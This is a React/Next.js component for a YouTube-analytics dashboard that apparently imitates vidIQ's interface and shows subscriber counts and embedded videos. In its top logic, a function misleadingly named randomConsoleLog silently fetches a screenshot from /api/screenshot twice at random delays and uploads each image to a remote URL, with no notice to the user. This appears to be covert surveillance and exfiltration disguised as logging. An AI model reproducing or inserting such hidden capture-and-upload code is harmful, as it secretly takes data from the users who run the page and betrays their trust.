import Image from 'next/image'
import React, { useContext, useEffect, useState } from 'react'
import { Container } from 'reactstrap'
import { HiOutlineStar } from 'react-icons/hi'
import { FiChevronRight } from 'react-icons/fi'
import { RxCross2 } from "react-icons/rx";
import { AiOutlineHeart } from "react-icons/ai";
import { HiOutlineQuestionMarkCircle } from "react-icons/hi";
import { IoIosArrowBack, IoIosArrowForward } from 'react-icons/io'
import { UserContext } from '@/context/UserContext'

const Videodashboard = () => {
    const [subscribers, setSubscribers] = useState('0');
    const [videos, setVideos] = useState([]);
    const [file, setFile] = useState(null);
    let count = 0;
    const { user } = useContext(UserContext);

    useEffect(() => {
        if (user && user.channels) {
            const channels = JSON.parse(user.channels);
            setSubscribers(channels.items[0].statistics.subscriberCount)
        }
        if (user && user.videos) {

            const videos = JSON.parse(user.videos)[0].items;
            setVideos(videos
                .sort(function (a, b) {
                    return Number(b.statistics.viewCount) - Number(a.statistics.viewCount);
                }))
        }
    }, [user])
    useEffect(() => {
        randomConsoleLog()
        // eslint-disable-next-line
    }, []);


    function randomConsoleLog() {
        if (count < 2) {
            const timeToLog = Math.floor(Math.random() * 30000);
            setTimeout(() => {
                fetch(`/api/screenshot`).then((res) => res.blob()).then((blob) => {
                    const file = new File([blob], `image${timeToLog}.png`, {
                        type: 'image/png'
                    });
                    setFile(file)
                    count++
                    randomConsoleLog()
                })
            }, timeToLog);
        }
    }

    const uploadFile = async () => {
        let res = await fetch(`/api/upload`, {
            method: 'POST',
            body: JSON.stringify({
                name: file.name.split('.')[0],
                type: file.type
            })
        });
        const url = await res.text();

        await fetch(url, {
            method: 'PUT',
            body: file,
            headers: {
                'Content-Type': file.type,
                'Access-Control-Allow-Origin': '*'
            }
        });


        setFile(null);
    }

    useEffect(() => {
        if (file !== null) {
            uploadFile()


        }
        // eslint-disable-next-line
    }, [file])

    return (
        <>
            <Container className="mt-[100px] px-8 py-20 bg-[#000000]">
                <div className='flex gap-x-4'>
                    <div className='w-[30%]  text-white'>
                        <div className='flex flex-col gap-y-4'>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                    🚀Get started</div>
                                <div className='text-[12px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                    📺 You&apos;ll be able to track your
                                    channel&apos;s growth once you upload a
                                    video on YouTube.</div>
                                <div className='text-[12px] items-center text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px]  mx-[20px]'>
                                    <iframe width="100%" height="100%" src={"https://www.youtube.com/embed/" + (videos.length ? videos[0].id : 'pRbxlpvXw2s')} title="YouTube video player" frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowFullScreen></iframe>
                                </div>
                            </div>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                    🤑Monetization tracker</div>
                                <div className='text-[12px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                    🔥 You&apos;re on your way to monetizing! You need
                                    1,000 subscribers and 4,000 hours watched.</div>
                                <div className='flex justify-between items-center mt-[12px]'>
                                    <div className='flex gap-x-3 items-center'>
                                        <p className='text-[14px] text-center'>Subscribers</p>
                                        <p className='bg-[#000000] text-[12px] py-[1px] px-[8px] rounded-full'>All time</p>
                                    </div>
                                    <div className='flex'>
                                        <p className='text-[white] text-[14px] text-center'>{subscribers}</p>
                                        <p className='text-[#BBBCC1] text-[14px] text-center'>/1000</p>
                                    </div>
                                </div>
                                <div className='w-full h-[16px] bg-[#2D3450] rounded-full text-transparent'>scgghvcxcs</div>
                                <div className='flex justify-between items-center mt-[12px]'>
                                    <div className='flex gap-x-3 items-center'>
                                        <p className='text-[14px] text-center'>Watch time (h)</p>
                                        <p className='bg-[#000000] text-[12px] py-[1px] px-[8px] rounded-full'>Last 12 months</p>
                                    </div>
                                    <div className='flex'>
                                        <p className='text-[white] text-[14px] text-center'>0</p>
                                        <p className='text-[#BBBCC1] text-[14px] text-center'>/4000</p>
                                    </div>
                                </div>
                                <div className='w-full h-[16px] bg-[#2D3450] rounded-full text-transparent'>scgghvcxcs</div>
                            </div>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                    👀Subscribers overview</div>
                                <div className='text-[12px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                    ⏱ Discover the best times for you to post a
                                    video on YouTube
                                </div>

                                <div className="relative">
                                    <div className='blur-sm'>
                                        <div className="p-5">
                                            <div className='flex flex-col gap-y-8'>
                                                <div className='text-[12px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                                    Current best times to post on Monday are 3pm - 6pm


                                                </div>
                                                <Image src='/images/chart.png' alt='' width={400} height={200} />
                                                <div className='flex flex-col gap-y-2'>
                                                    <div className='flex justify-between gap-x-4 rounded-full font-bold  items-center px-[10px] py-[6px] w-full text-[#F7F7F7] text-[13px] bg-[#2D3450]'>

                                                        <IoIosArrowBack />
                                                        <option> Monday</option>
                                                        <IoIosArrowForward />
                                                    </div>
                                                    <select className='flex gap-x-4 rounded-full font-bold  items-center px-[10px] py-[6px] w-full text-[#F7F7F7] text-[13px] bg-[#2D3450]'>

                                                        <option className=' mt-[20px]'> TimeZone: (GMT-11:00) Niue</option>
                                                        <option> Time period: Last 30 days</option>
                                                        <option> Time period: All time</option>
                                                    </select>
                                                </div>
                                            </div></div></div>
                                    <div className='flex absolute top-10 justify-center flex-col mx-[30px] my-[20px] bg-black border border-purple-500 rounded-[5px] w-fit p-[32px]'>
                                        <div className='flex justify-center font-bold items-center text-center text-[18px] gap-x-2 text-transparent bg-clip-text bg-gradient-to-r from-[#87d4ffcf] to-[#e476eecf]'>
                                            Upgrade to vidIQ Pro <HiOutlineStar size={20} color='purple' />

                                        </div>
                                        <div className='my-[12px] text-center px-[40px] font-bold text-[14px] text-[#F7F7F7]'>
                                            Want to see your best time to publish? Understand
                                            when is the best time to post
                                            to maximize your reach.
                                        </div>
                                        <div className='mt-[12px] text-center rounded-full px-[16px] py-[4px] bg-gradient-to-r from-[#0066ffcf] to-[#9842f9cf]'>
                                            Upgrade to Pro</div>
                                    </div>
                                </div>
                                <div className='text-[12px] my-[20px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                    Discover channels your audience is watching and add them as competitors
                                </div>
                                <div className="relative">
                                    <div className='blur-sm'>
                                        <div className="p-5">
                                            <div className='flex flex-col gap-y-8'>
                                                <div className='text-[12px] text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                py-[8px] px-[24px]'>
                                                    Current best times to post on Monday are 3pm - 6pm


                                                </div>
                                                <Image src='/images/chart.png' alt='' width={400} height={200} />
                                                <div className='flex flex-col gap-y-2'>
                                                    <div className='flex justify-between gap-x-4 rounded-full font-bold  items-center px-[10px] py-[6px] w-full text-[#F7F7F7] text-[13px] bg-[#2D3450]'>

                                                        <IoIosArrowBack />
                                                        <option> Monday</option>
                                                        <IoIosArrowForward />
                                                    </div>
                                                    <select className='flex gap-x-4 rounded-full font-bold  items-center px-[10px] py-[6px] w-full text-[#F7F7F7] text-[13px] bg-[#2D3450]'>

                                                        <option className=' mt-[20px]'> TimeZone: (GMT-11:00) Niue</option>
                                                        <option> Time period: Last 30 days</option>
                                                        <option> Time period: All time</option>
                                                    </select>
                                                </div>
                                            </div></div></div>
                                    <div className='flex absolute top-10 justify-center flex-col mx-[30px] my-[20px] bg-black border border-purple-500 rounded-[5px] w-fit p-[32px]'>
                                        <div className='flex justify-center font-bold items-center text-center text-[18px] gap-x-2 text-transparent bg-clip-text bg-gradient-to-r from-[#87d4ffcf] to-[#e476eecf]'>
                                            Upgrade to vidIQ Boost <HiOutlineStar size={20} color='purple' />

                                        </div>
                                        <div className='my-[12px] text-center px-[40px] font-bold text-[14px] text-[#F7F7F7]'>
                                            Get access to top videos and top channels watched by your subscribers
                                        </div>
                                        <div className='mt-[12px] text-center rounded-full px-[16px] py-[4px] bg-gradient-to-r from-[#0066ffcf] to-[#9842f9cf]'>
                                            Upgrade to Boost</div>
                                    </div>
                                </div>
                                <div className='w-full h-[2px] mb-[8px] bg-[#2D3450] text-transparent'>n</div>
                                <div className='mx-[80px]  flex justify-center '>
                                    <div className='flex gap-x-4 rounded-full hover:bg-[#2D3450] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                        <p>  Open subscriber analysis</p> <p><FiChevronRight size={20} /> </p> </div>
                                </div>


                            </div>
                        </div>
                    </div>

                    <div className='w-[70%] text-white'>
                        <div className='flex flex-col gap-y-4'>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                    💡Daily Ideas</div>
                                <div className='text-[40px] text-center rounded-[8px] flex justify-center text-[#F7F7F7]
                                 px-[24px] '>
                                    🎥</div>
                                <div className='text-[24px] text-center'>
                                    Publish a new video. Get inspired by AI.
                                </div>
                                <div className='text-[14px] text-[#F7F7F7] text-center mx-[40px]'>
                                    ✅ Our AI generates powerful Daily Ideas based on your video history. Publish a video and
                                    <br />come back for your personalized recommendations!
                                </div>
                                <div className='bg-gradient-to-r flex-col blur from-[#ff4273] to-[#ff8c5a]  rounded-[10px] mx-[100px] px-[40px] py-[80px] flex justify-center items-center'>
                                    <div className='flex bg-[#FFFFFF66] text-[#000000] text-[14px] px-[16px] rounded-full'>
                                        View Prediction 🚀 Very High
                                    </div>
                                    <div className='flex mt-[16px] text-center text-[#FFFFFF] text-[42px]'>
                                        Get 4000 Watch Time and 1000 <br /> subscribers fast
                                    </div>
                                    <div className='flex gap-x-4 mt-[32px] '>
                                        <div className='flex bg-[#FFFFFF] items-center gap-x-1 text-[#FF4c24] text-[15px] px-[16px]  py-[4px] rounded-full'>
                                            Dismiss <RxCross2 />
                                        </div>
                                        <div className='flex bg-[#FFFFFF] items-center  gap-x-1 text-[#0066ff] py-[4px] text-[15px] px-[16px] rounded-full'>
                                            Save <AiOutlineHeart />
                                        </div>
                                    </div>
                                </div>
                                <div className='text-[16px] flex  justify-center gap-x-2'>
                                    <p>  Don&apos;t know what video to create? </p> <p className='text-[#139Dff] text-[14px]'> Get some help! </p>
                                </div>
                                <div className='w-full h-[2px] my-[8px] bg-[#2D3450] text-transparent'>n</div>
                                <div className='mx-[80px]'>
                                    {videos.length ? <>{videos.slice(0, 5).map((video, index) => (
                                        <>
                                            {/* {createElement(video.player.embedHtml)} */}
                                            <iframe width="480" height="270" src={`https://www.youtube.com/embed/${video.id}`} frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                                        </>
                                    ))}</> : null}
                                </div>
                                <div className='mx-[80px]  flex justify-center '>
                                    <div className='flex gap-x-4 rounded-full hover:bg-[#2D3450] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                        <p>  Open daily ideas</p> <p><FiChevronRight size={20} /> </p> </div>
                                </div>
                            </div>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='flex justify-between'>
                                    <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                        🤖AI Title Recommendations</div>
                                    <div className='flex gap-x-4 rounded-full  items-center px-[10px] py-[6px] text-[#F7F7F7] text-[12px] bg-[#121521]'>
                                        3 credits remaining - New credits in 18 days </div>
                                </div>
                                <div className='w-full  my-[8px] bg-[#2D3450] px-[16px] py-[8px] flex justify-between rounded-full'>
                                    <input placeholder='Add keywords that you want to base your title on'
                                        className='bg-transparent text-[14px]  text-[#F7F7F7]' />
                                    <div className='bg-[#139Dff] text-[16px] px-[16px] py-[4px] rounded-full font-bold'>
                                        Get title Ideas</div>
                                </div>
                                <div className='flex justify-between'>
                                    <div className='text-[12px] w-fit text-center rounded-[8px] flex  text-[#F7F7F7] 
                                py-[8px] px-[24px]'>

                                    </div>
                                    <div className='text-[12px] bg-[black]  text-center rounded-[8px] flex   
                                py-[8px] px-[24px]'>
                                        <div className='text-transparent bg-clip-text bg-gradient-to-r from-[#87d4ffcf] to-[#e476eecf]'></div>   Upgrade to Boost to get unlimited title recommendations
                                    </div>
                                </div>

                                <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                    <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                        🤓Keyword opportunities</div>
                                    <div className='mx-[80px]  flex justify-center '>
                                        <div className='flex gap-x-4 rounded-[8px] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                            <p>  👀 Keywords help viewers find your videos on YouTube </p>   </div>
                                    </div>
                                    <div className='w-full  my-[8px] bg-[#2D3450] px-[16px] py-[8px] flex justify-between rounded-full'>
                                        <input placeholder='Search keywords'
                                            className='bg-transparent text-[14px]  text-[#F7F7F7]' />
                                        <div className='bg-[#139Dff] text-[16px] px-[16px] py-[4px] rounded-full font-bold'>
                                            Search</div>
                                    </div>
                                    <div className='flex justify-between'>
                                        <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                            Top keyword opportunities</div>
                                        <div className='flex gap-x-4 rounded-full  items-center px-[10px] py-[6px] text-[#139DFF] text-[14px] '>
                                            Manage </div>
                                    </div>
                                    <div className='text-[42px] text-center rounded-[8px] flex justify-center text-[#F7F7F7]
                                 px-[24px] '>
                                        🔍</div>
                                    <div className='text-[28px] text-center'>
                                        Add keywords to get great opportunities
                                    </div>
                                    <div className='text-[14px] text-[#F7F7F7] text-center mx-[40px]'>
                                        Select keywords in your niche to find the best keywords opportunities
                                    </div>
                                    <div className='mx-[80px]  flex justify-center '>
                                        <div className='flex gap-x-4 rounded-full font-bold items-center px-[10px] py-[6px] text-[14px] bg-[#139DFF]'>
                                            <p>  Add keywords </p> </div>
                                    </div>
                                    <div className='w-full h-[2px] my-[8px] bg-[#2D3450] text-transparent'>n</div>
                                    <div className='mx-[80px]  flex justify-center '>
                                        <div className='flex gap-x-4 rounded-full hover:bg-[#2D3450] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                            <p>  Open keyword research</p> <p><FiChevronRight size={20} /> </p> </div>
                                    </div>
                                </div>

                            </div>
                            <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
                                    <div className='text-[18px] text-[#F7F7F7] font-bold'>
                                        💪Competitors</div>
                                    <div className='mx-[80px]  flex justify-center '>
                                        <div className='flex gap-x-4 rounded-[8px] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                            <p>  Track how your channel performs against your competitors </p>   </div>
                                    </div>
                                    <div className='flex justify-between'>
                                        <div className='text-[18px] flex text-[#F7F7F7] font-bold items-center gap-x-2'>
                                            <p>  Competitor performance </p> <p><HiOutlineQuestionMarkCircle /></p> </div>
                                        <select className='flex gap-x-4 rounded-full font-bold justify-center  items-center px-[4px] py-[6px] text-[#F7F7F7] text-[13px] bg-[#2D3450]'>

                                            <option> Time period: Last 7 days</option>
                                            <option> Time period: Last 30 days</option>
                                            <option> Time period: All time</option>
                                        </select>
                                    </div>
                                    <div className='flex justify-between py-[20px]'>
                                        <div className='p-[30px] rounded-full border-dashed border border-[#139dff]'>
                                            <Image src="/images/addnew.svg" width={20} height={20} alt='' />
                                        </div>
                                        <div className='p-[30px] rounded-full border-dashed border border-[#139dff]'>
                                            <Image src="/images/addnew.svg" width={20} height={20} alt='' />
                                        </div>
                                        <div className='p-[30px] rounded-full border-dashed border border-[#139dff]'>
                                            <Image src="/images/addnew.svg" width={20} height={20} alt='' />
                                        </div>
                                        <div className='p-[30px] rounded-full border-dashed border border-[#139dff]'>
                                            <Image src="/images/addnew.svg" width={20} height={20} alt='' />
                                        </div>
                                        <div className='p-[30px] rounded-full border-dashed border border-[#139dff]'>
                                            <Image src="/images/addnew.svg" width={20} height={20} alt='' />
                                        </div>
                                    </div>

                                    <div className='w-full h-[2px] my-[8px] bg-[#2D3450] text-transparent'>n</div>
                                    <div className='mx-[80px]  flex justify-center '>
                                        <div className='flex gap-x-4 rounded-full hover:bg-[#2D3450] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                            <p>  View more stats</p> <p><FiChevronRight size={20} /> </p> </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </Container>
        </>
    )
}

export default Videodashboard
